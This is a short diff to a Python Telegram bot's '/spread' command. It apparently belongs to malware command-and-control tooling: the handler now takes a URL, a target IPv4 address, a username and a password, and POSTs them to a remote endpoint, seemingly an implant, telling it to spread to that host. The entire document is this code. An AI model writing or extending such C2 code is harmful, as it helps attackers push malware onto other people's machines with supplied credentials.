@@ -68,15 +68,18 @@ def spread(update,context):
 
 	if not authorized(update.message.chat_id):return
 
-	if len(context.args) != 1:
-		update.message.reply_text("Usage: /spread <URL> , one and only one argument is required")
+	if len(context.args) != 4:
+		update.message.reply_text("Usage: /spread <URL> <HOST> <USERNAME> <PASSWORD>, four arguments are required")
 		return
 		
 	if not validators.url(context.args[0]):
 		update.message.reply_text("Given argument is not an URL")
 		return
+	if not validators.ip_address.ipv4(context.args[1]):
+		update.message.reply_text("Given ipv4 is not valid")
+		return
 	
-	request = requests.post(context.args[0],data="spread")
+	request = requests.post(context.args[0],data="spread&"+context.args[1]+"&"+context.args[2]+"&"+context.args[3])
 	if request.status_code == 200:
 		update.message.reply_text(request.text)
 	else:
